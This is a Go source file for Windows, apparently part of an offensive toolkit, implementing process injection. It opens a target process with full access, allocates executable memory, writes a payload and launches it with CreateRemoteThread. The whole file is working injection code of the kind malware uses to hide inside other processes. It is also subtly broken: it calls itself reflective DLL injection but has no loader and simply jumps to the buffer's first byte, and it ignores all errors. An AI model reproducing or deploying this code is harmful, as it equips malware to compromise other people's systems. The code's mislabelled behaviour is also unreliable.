//go:build windows

package process_injection

import (
"golang.org/x/sys/windows"
"unsafe"
)

type ReflectiveDLL struct{}

func NewReflectiveDLL() *ReflectiveDLL {
return &ReflectiveDLL{}
}

func (r *ReflectiveDLL) Inject(pid int, dllData []byte) error {
kernel32 := windows.NewLazyDLL("kernel32.dll")
procOpenProcess := kernel32.NewProc("OpenProcess")
procVirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
procWriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
procCreateRemoteThread := kernel32.NewProc("CreateRemoteThread")

handle, _, _ := procOpenProcess.Call(0x1F0FFF, 0, uintptr(pid))

addr, _, _ := procVirtualAllocEx.Call(handle, 0, uintptr(len(dllData)), 0x3000, 0x40)
var written uintptr
procWriteProcessMemory.Call(handle, addr, uintptr(unsafe.Pointer(&dllData[0])), uintptr(len(dllData)), uintptr(unsafe.Pointer(&written)))

procCreateRemoteThread.Call(handle, 0, 0, addr, 0, 0, 0)
return nil
}
